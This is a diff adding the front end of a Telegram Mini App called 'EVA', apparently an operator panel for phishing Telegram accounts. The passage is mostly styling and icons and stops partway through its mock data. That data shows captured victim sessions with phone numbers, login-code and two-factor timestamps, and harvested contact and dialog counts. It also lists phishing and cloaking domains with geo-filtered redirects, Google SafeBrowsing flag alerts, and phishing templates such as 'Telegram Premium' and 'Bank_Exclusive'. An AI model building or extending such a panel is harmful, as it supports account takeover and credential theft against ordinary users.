@@ -1,0 +1,1459 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<title>EVA</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#03060a; --card:#05080d; --card-border:#1a2a2e;
+    --input-bg:#03060a; --input-border:#1a2a2e; --hairline:#1a2a2e;
+    --text:#c8ffec; --text-soft:#c8ffec; --muted:#5a7a72; --label:#3d6962; --hint:#3d6962;
+    --accent:#00ffd1; --accent-soft:#002820;
+    --ok:#5cff5c; --ok-bg:#002820;
+    --warn:#ffe600; --warn-bg:#1a1700;
+    --err:#ff3860; --err-bg:#1a0610;
+    --magenta:#ff2bd6; --magenta-bg:#1a0612;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+    font-family:'Share Tech Mono', ui-monospace, monospace;
+    height:100%;overflow:hidden;-webkit-text-size-adjust:100%;}
+  body{display:flex;flex-direction:column;
+    padding-top:env(safe-area-inset-top);
+    padding-bottom:env(safe-area-inset-bottom);position:relative;}
+  body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:9000;
+    background:repeating-linear-gradient(0deg,transparent 0,transparent 2px,
+      rgba(0,255,209,.035) 2px,rgba(0,255,209,.035) 3px);}
+
+  /* topbar */
+  .topbar{display:flex;align-items:center;gap:10px;padding:12px 14px 8px;
+    border-bottom:1px solid var(--hairline);min-height:42px;}
+  .topbar .back{font-size:22px;line-height:1;color:var(--accent);cursor:pointer;
+    padding:2px 6px 4px;display:none;}
+  .topbar .back.show{display:inline-block}
+  .topbar .title{flex:1;font:24px/1 'VT323',monospace;color:var(--text);
+    text-shadow:1px 0 var(--magenta),-1px 0 var(--accent);letter-spacing:.04em;
+    text-transform:uppercase;}
+  .topbar .sub{font-size:10px;color:var(--muted);letter-spacing:.12em;
+    text-transform:uppercase;margin-top:3px}
+  .topbar .bell{position:relative;width:32px;height:32px;display:flex;
+    align-items:center;justify-content:center;cursor:pointer;color:var(--accent);
+    border:1px solid var(--card-border);}
+  .topbar .bell .badge{position:absolute;top:-4px;right:-4px;background:var(--magenta);
+    color:#0a0006;font-size:10px;min-width:16px;height:16px;padding:0 4px;
+    display:flex;align-items:center;justify-content:center;border:1px solid var(--bg);}
+
+  main{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;
+    padding:12px 14px 80px;}
+
+  /* tab bar */
+  nav.tabs{display:flex;border-top:1px solid var(--hairline);background:var(--bg);
+    padding:6px 4px;position:relative;z-index:9001;}
+  nav.tabs .tab{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;
+    color:var(--muted);cursor:pointer;padding:6px 2px;font-size:9.5px;font-weight:400;
+    letter-spacing:.1em;text-transform:uppercase;
+    border-top:2px solid transparent;margin-top:-6px;padding-top:8px;}
+  nav.tabs .tab.active{color:var(--accent);border-top-color:var(--accent);
+    text-shadow:0 0 8px rgba(0,255,209,.5);}
+  nav.tabs .tab .ico{font-size:18px;line-height:1}
+
+  /* cards */
+  .card{background:var(--card);border:1px solid var(--card-border);
+    border-radius:0;padding:13px 14px;margin-bottom:9px;cursor:pointer}
+  .card.tight{padding:11px 12px}
+  .card.nopad{padding:0}
+  .card.static{cursor:default}
+  .card:active{background:#0a0d12}
+  .row{display:flex;align-items:center;gap:10px}
+  .row.between{justify-content:space-between}
+  .row.wrap{flex-wrap:wrap}
+  .v{display:flex;flex-direction:column;gap:6px}
+  .gap-s{gap:6px}.gap-m{gap:10px}.gap-l{gap:14px}
+  .grow{flex:1;min-width:0}
+
+  .section-label{padding:12px 4px 6px;color:var(--label);
+    font:10px 'Share Tech Mono',monospace;
+    letter-spacing:.16em;text-transform:uppercase;
+    display:flex;align-items:center;gap:6px;}
+  .section-label::before{content:'┌──';color:var(--label);}
+  .section-label::after{content:'──┐';margin-left:auto;color:var(--label);}
+
+  /* pills */
+  .pill{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:0;
+    font-size:10px;font-weight:400;line-height:1.5;letter-spacing:.08em;
+    border:1px solid currentColor;text-transform:uppercase;}
+  .pill.ok{color:var(--ok)}
+  .pill.warn{color:var(--warn)}
+  .pill.err{color:var(--err)}
+  .pill.muted{color:var(--muted)}
+  .pill.mag{color:var(--magenta)}
+  .pill.dot::before{content:"";width:5px;height:5px;border-radius:50%;
+    background:currentColor;box-shadow:0 0 5px currentColor;}
+
+  /* KPI grid */
+  .kpis{display:grid;grid-template-columns:repeat(2,1fr);gap:6px;margin-bottom:10px}
+  .kpi{background:var(--card);border:1px solid var(--card-border);
+    padding:12px 12px 11px;}
+  .kpi .v{font-family:'VT323',monospace;font-size:30px;color:var(--text);
+    line-height:1;text-shadow:0 0 8px rgba(0,255,209,.3);}
+  .kpi .v.mag{color:var(--magenta);text-shadow:0 0 10px rgba(255,43,214,.5);}
+  .kpi .k{font-size:10px;color:var(--label);margin-top:4px;
+    text-transform:uppercase;letter-spacing:.12em}
+  .kpi .delta{font-size:10px;margin-top:3px;letter-spacing:.06em;}
+  .kpi .delta.up{color:var(--ok)}
+  .kpi .delta.down{color:var(--err)}
+
+  /* buttons */
+  .btn{display:flex;align-items:center;justify-content:center;width:100%;
+    border:1px solid var(--accent);border-radius:0;padding:13px 18px;
+    font:13px/1 'Share Tech Mono',monospace;letter-spacing:.2em;
+    text-transform:uppercase;cursor:pointer;
+    background:var(--accent-soft);color:var(--accent);-webkit-appearance:none;
+    box-shadow:0 0 18px rgba(0,255,209,.18),inset 0 0 24px rgba(0,255,209,.05);}
+  .btn:active{filter:brightness(.85)}
+  .btn.ghost{background:transparent;color:var(--accent);
+    border:1px solid var(--card-border);box-shadow:none;}
+  .btn.danger{background:var(--err-bg);color:var(--err);border-color:var(--err);
+    box-shadow:0 0 18px rgba(255,56,96,.2);}
+  .btn.muted{background:var(--input-bg);color:var(--muted);
+    border-color:var(--input-border);box-shadow:none;}
+  .btn.small{padding:8px 12px;font-size:10.5px;letter-spacing:.14em;width:auto}
+  .btn.tiny{padding:5px 8px;font-size:9.5px;letter-spacing:.1em;width:auto}
+
+  /* inputs */
+  .input,.textarea,.select{width:100%;background:var(--input-bg);
+    border:1px solid var(--input-border);border-radius:0;padding:11px 13px;
+    color:var(--text);font-size:13.5px;font-family:'Share Tech Mono',monospace;
+    outline:none;-webkit-appearance:none;}
+  .input:focus,.textarea:focus,.select:focus{border-color:var(--accent);
+    box-shadow:0 0 14px rgba(0,255,209,.18);}
+  .textarea{resize:vertical;min-height:90px;}
+  .field-hint{font-size:11px;color:var(--hint);margin-top:5px;line-height:1.55;}
+  .field-row{margin-bottom:14px}
+  .field-row .lbl{font-size:10px;text-transform:uppercase;letter-spacing:.14em;
+    color:var(--label);margin-bottom:6px;}
+
+  /* radio / checkbox */
+  .radio{display:flex;align-items:center;gap:8px;padding:8px 10px;
+    border:1px solid var(--card-border);cursor:pointer;flex:1;}
+  .radio.active{border-color:var(--accent);background:var(--accent-soft);color:var(--accent);}
+  .radio .dot{width:12px;height:12px;border:1px solid currentColor;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;}
+  .radio.active .dot::after{content:"";width:6px;height:6px;border-radius:50%;
+    background:currentColor;box-shadow:0 0 6px currentColor;}
+  .check{display:flex;align-items:center;gap:8px;padding:6px 0;cursor:pointer;}
+  .check .box{width:14px;height:14px;border:1px solid var(--muted);
+    display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+  .check.on .box{border-color:var(--accent);background:var(--accent-soft);}
+  .check.on .box::after{content:"✓";color:var(--accent);font-size:11px;line-height:1;}
+
+  /* chips */
+  .chips{display:flex;gap:5px;overflow-x:auto;-webkit-overflow-scrolling:touch;
+    padding-bottom:4px;margin-bottom:8px;scrollbar-width:none}
+  .chips::-webkit-scrollbar{display:none}
+  .chip{display:inline-flex;align-items:center;gap:5px;padding:6px 11px;
+    background:var(--card);border:1px solid var(--card-border);color:var(--text-soft);
+    font-size:11px;flex-shrink:0;cursor:pointer;white-space:nowrap;letter-spacing:.04em;
+    text-transform:uppercase;}
+  .chip.active{background:var(--accent-soft);color:var(--accent);
+    border-color:var(--accent);box-shadow:0 0 12px rgba(0,255,209,.2);}
+
+  /* funnel */
+  .funnel-row{display:grid;grid-template-columns:24px 90px 60px 1fr;gap:8px;
+    align-items:center;padding:4px 0;font-size:12px;}
+  .funnel-row .lbl{color:var(--muted);text-transform:uppercase;letter-spacing:.06em;font-size:10px;}
+  .funnel-row .val{color:var(--text);font-family:'VT323',monospace;font-size:18px;text-align:right}
+  .funnel-row .bar{height:8px;background:var(--input-bg);border:1px solid var(--input-border);position:relative;}
+  .funnel-row .bar i{position:absolute;left:0;top:0;bottom:0;background:var(--accent);
+    box-shadow:0 0 8px rgba(0,255,209,.5);}
+
+  /* sheet */
+  .sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:50;display:none;}
+  .sheet{position:fixed;left:0;right:0;bottom:0;background:var(--bg);
+    border:1px solid var(--accent);border-bottom:none;
+    z-index:51;display:none;
+    padding:20px 16px calc(28px + env(safe-area-inset-bottom));
+    max-height:90vh;overflow-y:auto;
+    box-shadow:0 -20px 60px rgba(0,255,209,.12);
+    animation:sheetUp .22s cubic-bezier(.18,.89,.32,1.28);}
+  .sheet.show,.sheet-bg.show{display:block}
+  body.sheet-open nav.tabs{display:none;}
+  .sheet-handle{width:60px;height:2px;background:var(--accent);margin:0 auto 14px;
+    box-shadow:0 0 8px var(--accent);}
+  .sheet-title{font:22px 'VT323',monospace;color:var(--text);margin-bottom:14px;
+    text-shadow:1px 0 var(--magenta),-1px 0 var(--accent);letter-spacing:.04em;
+    text-transform:uppercase;}
+  .sheet-close{position:absolute;top:14px;right:14px;color:var(--muted);
+    font-size:18px;cursor:pointer;}
+  @keyframes sheetUp{from{transform:translateY(100%)}to{transform:none}}
+
+  /* toast */
+  #toast{position:fixed;left:50%;bottom:80px;transform:translateX(-50%);
+    background:var(--bg);border:1px solid var(--accent);color:var(--accent);
+    padding:10px 16px;font-size:12px;letter-spacing:.1em;text-transform:uppercase;
+    z-index:200;display:none;box-shadow:0 0 20px rgba(0,255,209,.3);}
+  #toast.err{border-color:var(--err);color:var(--err);box-shadow:0 0 20px rgba(255,56,96,.3);}
+
+  /* code block */
+  .codeblock{font-family:'Share Tech Mono',monospace;font-size:12.5px;
+    background:var(--input-bg);border:1px solid var(--input-border);
+    padding:10px 12px;color:var(--text-soft);word-break:break-all;cursor:pointer;}
+  .codeblock:active{background:#000}
+
+  /* small text utility */
+  .t-muted{color:var(--muted);font-size:11px}
+  .t-label{color:var(--label);font-size:10px;text-transform:uppercase;letter-spacing:.14em}
+  .t-mag{color:var(--magenta)}
+  .t-acc{color:var(--accent)}
+  .t-ok{color:var(--ok)}
+  .t-err{color:var(--err)}
+  .t-warn{color:var(--warn)}
+  .num{font-family:'VT323',monospace;font-size:18px;line-height:1}
+  .nowrap{white-space:nowrap}
+  .chev{color:var(--muted);font-size:14px}
+  .hr{height:1px;background:var(--hairline);margin:10px 0}
+
+  /* search */
+  .search{display:flex;align-items:center;gap:8px;background:var(--input-bg);
+    border:1px solid var(--input-border);padding:9px 11px;margin-bottom:8px;}
+  .search input{flex:1;background:transparent;border:none;color:var(--text);
+    font-family:'Share Tech Mono',monospace;font-size:13px;outline:none;}
+  .search .filt{color:var(--accent);cursor:pointer;font-size:14px;}
+
+  /* alert card */
+  .alert{background:var(--card);border:1px solid var(--err);border-left-width:3px;
+    padding:11px 12px;margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px;}
+  .alert.warn{border-color:var(--warn)}
+  .alert .ic{font-size:20px;flex-shrink:0;}
+  .alert .grow .ttl{font-size:13px;color:var(--text);}
+  .alert .grow .sb{font-size:10.5px;color:var(--muted);margin-top:2px;letter-spacing:.04em;}
+
+  /* session row */
+  .srow{display:flex;align-items:center;gap:10px;padding:11px 12px;
+    background:var(--card);border:1px solid var(--card-border);margin-bottom:6px;cursor:pointer;}
+  .srow:active{background:#0a0d12}
+  .srow .phone{font-size:13px;color:var(--text);}
+  .srow .meta{font-size:10.5px;color:var(--muted);margin-top:2px;letter-spacing:.04em;}
+
+  /* bottom action bar (inside main) */
+  .actbar{display:flex;gap:6px;padding:8px 0 0;border-top:1px solid var(--hairline);
+    margin-top:8px;}
+
+  /* skeleton */
+  @keyframes pulse{0%,100%{opacity:.4}50%{opacity:.8}}
+  .skel{background:var(--card);border:1px solid var(--card-border);height:54px;
+    margin-bottom:6px;animation:pulse 1.4s ease-in-out infinite;}
+  .skel.tall{height:90px}
+
+  /* empty state */
+  .empty{padding:40px 20px;text-align:center;color:var(--muted);}
+  .empty .ic{font-size:42px;color:var(--label);margin-bottom:12px;
+    font-family:'VT323',monospace;}
+  .empty .ttl{font-size:14px;color:var(--text-soft);margin-bottom:8px;}
+  .empty .sb{font-size:11px;line-height:1.5;margin-bottom:16px;}
+
+  /* color swatch */
+  .swatch{display:flex;align-items:center;gap:8px}
+  .swatch .sw{width:32px;height:32px;border:1px solid var(--card-border);flex-shrink:0;}
+
+  /* segmented */
+  .seg{display:flex;border:1px solid var(--card-border);margin-bottom:10px;}
+  .seg .s{flex:1;text-align:center;padding:8px 4px;cursor:pointer;
+    font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);}
+  .seg .s.active{background:var(--accent-soft);color:var(--accent);}
+
+  /* misc */
+  .mt-s{margin-top:6px}.mt-m{margin-top:12px}.mt-l{margin-top:18px}
+  .mb-s{margin-bottom:6px}.mb-m{margin-bottom:12px}
+  .icobtn{width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;
+    border:1px solid var(--card-border);background:var(--input-bg);cursor:pointer;
+    color:var(--accent);font-size:13px;}
+  .icobtn.danger{border-color:var(--err);color:var(--err);background:var(--err-bg);}
+
+  /* SVG icons */
+  .svgi{display:inline-block;vertical-align:middle;color:currentColor;flex-shrink:0;}
+  .svgi.x14{width:14px;height:14px;}
+  .svgi.x16{width:16px;height:16px;}
+  .svgi.x18{width:18px;height:18px;}
+  .svgi.x20{width:20px;height:20px;}
+  .svgi.x22{width:22px;height:22px;}
+  .svgi.x28{width:28px;height:28px;}
+  nav.tabs .tab .svgi{margin-bottom:2px;}
+  .alert .ic .svgi{width:22px;height:22px;}
+  .funnel-row .ico-cell{display:flex;align-items:center;justify-content:center;color:var(--accent);}
+  .topbar .bell .svgi{width:18px;height:18px;}
+  .topbar .back .svgi{width:18px;height:18px;}
+  .icobtn .svgi{width:14px;height:14px;}
+  .chev-svg{color:var(--muted);width:14px;height:14px;display:inline-block;vertical-align:middle;}
+</style>
+</head>
+<body>
+
+  <!-- SVG sprite -->
+  <svg width="0" height="0" style="position:absolute" aria-hidden="true">
+    <defs>
+      <symbol id="ic-home" viewBox="0 0 24 24"><path d="M3 11l9-8 9 8" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 10v10h14V10" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M10 20v-6h4v6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-globe" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M3 12h18M12 3c3 3 3 15 0 18M12 3c-3 3-3 15 0 18" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-target" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.9"/><circle cx="12" cy="12" r="5" fill="none" stroke="currentColor" stroke-width="1.9"/><circle cx="12" cy="12" r="1.5" fill="currentColor"/></symbol>
+      <symbol id="ic-bars" viewBox="0 0 24 24"><rect x="3" y="13" width="4" height="8" rx="1" fill="none" stroke="currentColor" stroke-width="1.9"/><rect x="10" y="8" width="4" height="13" rx="1" fill="none" stroke="currentColor" stroke-width="1.9"/><rect x="17" y="4" width="4" height="17" rx="1" fill="none" stroke="currentColor" stroke-width="1.9"/></symbol>
+      <symbol id="ic-gear" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3h.1a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5h.1a1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8v.1a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/></symbol>
+
+      <symbol id="ic-bell" viewBox="0 0 24 24"><path d="M6 16V10a6 6 0 0 1 12 0v6l1.5 2h-15L6 16Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M10 20a2 2 0 0 0 4 0" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-back" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-chev" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-plus" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></symbol>
+      <symbol id="ic-search" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M21 21l-5-5" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-filter" viewBox="0 0 24 24"><path d="M3 5h18l-7 9v6l-4-2v-4L3 5Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-dots" viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.6" fill="currentColor"/><circle cx="12" cy="12" r="1.6" fill="currentColor"/><circle cx="12" cy="19" r="1.6" fill="currentColor"/></symbol>
+
+      <symbol id="ic-copy" viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M5 15V6a2 2 0 0 1 2-2h9" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-edit" viewBox="0 0 24 24"><path d="M4 20h4l11-11-4-4L4 16v4Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M14 6l4 4" fill="none" stroke="currentColor" stroke-width="1.9"/></symbol>
+      <symbol id="ic-trash" viewBox="0 0 24 24"><path d="M4 7h16M9 7V5a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2M6 7l1 13a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2l1-13" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-send" viewBox="0 0 24 24"><path d="M22 2 11 13" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 2l-7 20-4-9-9-4 20-7Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-eye" viewBox="0 0 24 24"><path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" fill="none" stroke="currentColor" stroke-width="1.9"/></symbol>
+      <symbol id="ic-refresh" viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-3-6.7" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 4v5h-5" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-link" viewBox="0 0 24 24"><path d="M10 14a4 4 0 0 0 5.7 0l3-3a4 4 0 0 0-5.7-5.7l-1.5 1.5" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 10a4 4 0 0 0-5.7 0l-3 3a4 4 0 0 0 5.7 5.7l1.5-1.5" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-mask" viewBox="0 0 24 24"><path d="M3 8c0-2 2-4 4-4 2 0 3 1 5 1s3-1 5-1c2 0 4 2 4 4 0 6-4 12-9 12S3 14 3 8Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><circle cx="9" cy="11" r="1.4" fill="currentColor"/><circle cx="15" cy="11" r="1.4" fill="currentColor"/></symbol>
+      <symbol id="ic-check" viewBox="0 0 24 24"><path d="M5 12l5 5L20 7" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-x" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></symbol>
+      <symbol id="ic-warn" viewBox="0 0 24 24"><path d="M12 3l10 18H2L12 3Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M12 10v5M12 18v.5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></symbol>
+      <symbol id="ic-skull" viewBox="0 0 24 24"><path d="M5 11a7 7 0 0 1 14 0v4l-2 2v3h-3v-2h-4v2H7v-3l-2-2v-4Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><circle cx="9" cy="12" r="1.4" fill="currentColor"/><circle cx="15" cy="12" r="1.4" fill="currentColor"/></symbol>
+      <symbol id="ic-star" viewBox="0 0 24 24"><path d="M12 3l3 6 6 .9-4.5 4.4 1 6.2L12 17.7 6.5 20.5l1-6.2L3 9.9 9 9l3-6Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-clock" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M12 7v5l3 2" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+
+      <!-- funnel icons -->
+      <symbol id="ic-funnel-eye" viewBox="0 0 24 24"><path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" fill="none" stroke="currentColor" stroke-width="1.9"/></symbol>
+      <symbol id="ic-funnel-doc" viewBox="0 0 24 24"><path d="M14 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9l-6-6Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M14 3v6h6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-funnel-phone" viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2.5" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M10 19h4" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-funnel-msg" viewBox="0 0 24 24"><path d="M3 5h18v12H8l-5 4V5Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M7 10h10M7 13h6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-funnel-key" viewBox="0 0 24 24"><circle cx="8" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M11 13l9-9M16 8l2 2M18 6l2 2" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-funnel-done" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M8 12l3 3 5-6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+    </defs>
+  </svg>
+
+  <div class="topbar">
+    <span class="back" id="backbtn" onclick="nav.back()"><svg class="svgi"><use href="#ic-back"/></svg></span>
+    <div class="v" style="gap:1px">
+      <div class="title" id="screen-title">EVA</div>
+      <div class="sub" id="screen-sub"></div>
+    </div>
+    <div class="bell" onclick="nav.go('notifications')">
+      <svg class="svgi"><use href="#ic-bell"/></svg>
+      <span class="badge" id="bell-badge">3</span>
+    </div>
+  </div>
+
+  <main id="content"></main>
+
+  <nav class="tabs">
+    <div class="tab active" data-tab="home"><svg class="svgi x22"><use href="#ic-home"/></svg>Главная</div>
+    <div class="tab" data-tab="domains"><svg class="svgi x22"><use href="#ic-globe"/></svg>Домены</div>
+    <div class="tab" data-tab="sessions"><svg class="svgi x22"><use href="#ic-target"/></svg>Сессии</div>
+    <div class="tab" data-tab="stats"><svg class="svgi x22"><use href="#ic-bars"/></svg>Стат</div>
+    <div class="tab" data-tab="settings"><svg class="svgi x22"><use href="#ic-gear"/></svg>Настр</div>
+  </nav>
+
+  <div class="sheet-bg" id="sheet-bg" onclick="closeSheet()"></div>
+  <div class="sheet" id="sheet">
+    <div class="sheet-handle"></div>
+    <span class="sheet-close" onclick="closeSheet()">✕</span>
+    <div id="sheet-body"></div>
+  </div>
+
+  <div id="toast"></div>
+
+<script>
+/* ============ MOCK DATA ============ */
+const DATA = {
+  kpi:{ total:14201, today:87, todayDelta:1.2, activeDomains:23, conversion:11.8, conversionDelta:0.4 },
+  alerts:[
+    {id:1,sev:'warn',icId:'ic-warn',title:'evil.com — Google SafeBrowsing',sub:'помечен · 2 часа назад',ref:{type:'domain',id:1}},
+    {id:2,sev:'err',icId:'ic-skull',title:'second-site.net — домен мёртв',sub:'3 проверки подряд',ref:{type:'domain',id:2}},
+  ],
+  sessions:[
+    {id:1,phone:'+7(999)123-45-67',status:'done',premium:true,domain:'evil-domain.com',link:'traffic_vk',ago:'2м',username:'@username',name:'Иван Иванов',tg_id:123456789,dc:2,contacts:1203,dialogs:847,groups:23,channels:156,template:'Telegram_v2',timeline:{phone:'14:22:11',code:'14:22:34',twofa:null,done:'14:22:35'},spamblock:false,premium_until:'31 дек 2025'},
+    {id:2,phone:'+7(903)456-78-90',status:'2fa',premium:false,domain:'evil-domain.com',link:'traffic_vk',ago:'5м',contacts:0,template:'Telegram_v2'},
+    {id:3,phone:'+7(812)789-00-11',status:'done',premium:false,domain:'evil-domain.com',link:'traffic_fb',ago:'12м',contacts:432,template:'Telegram_v2'},
+    {id:4,phone:'+1(646)000-11-22',status:'dead',premium:false,domain:'evil-domain.com',link:'traffic_vk',ago:'1ч',contacts:0,template:'Telegram_v2'},
+    {id:5,phone:'+3(809)111-22-33',status:'done',premium:true,domain:'evil-domain.com',link:'traffic_fb',ago:'2ч',contacts:899,template:'Telegram_v2'},
+  ],
+  domains:[
+    {id:1,fqdn:'lorem.com',type:'phishing',status:'active',cf:true,sb:'clean',
+     template:'Telegram_v2',redirect:'https://t.me/durov',zone:'abc123def456',
+     created:'15 июня 2025',
+     stats:{clicks:1204,loads:1088,phones:892,codes:671,twofa:234,done:142},
+     phishLinks:[
+       {id:1,label:'traffic_vk',slug:'a1b2c3d4',clicks:450,phones:312,done:67,conv:14.9},
+       {id:2,label:'traffic_fb',slug:'x9y8z7w6',clicks:122,phones:89,done:23,conv:18.9},
+     ]},
+    {id:2,fqdn:'lorem.xyz',type:'cloaking',status:'active',cf:true,sb:'clean',
+     stats:{clicks:3204},
+     cloakLinks:[
+       {id:1,slug:'promo',offer:'https://real-offer.com/p',white:'https://t.me/channel',
+        geoMode:'whitelist',countries:['RU','BY','KZ'],total:3202,offerCount:1891}
+     ]},
+    {id:3,fqdn:'pending-domain.ru',type:'phishing',status:'pending',cf:false,
+     ns:['ns1.cloudflare.com','ns2.cloudflare.com']},
+    {id:4,fqdn:'broken.net',type:'phishing',status:'error',cf:false,err:'CF: зона не найдена'},
+  ],
+  templates:{
+    system:[
+      {id:'sys1',name:'Telegram Premium',kind:'universal',def:true},
+      {id:'sys2',name:'Bank_Exclusive',kind:'exclusive'},
+    ],
+    mine:[
+      {id:1,name:'Telegram_v2',domains:4,sessions:142,weekDelta:87,
+       pages:{
+         main:{h1:'Telegram Premium',subtitle:"Yubileymiz munosabati bilan...",
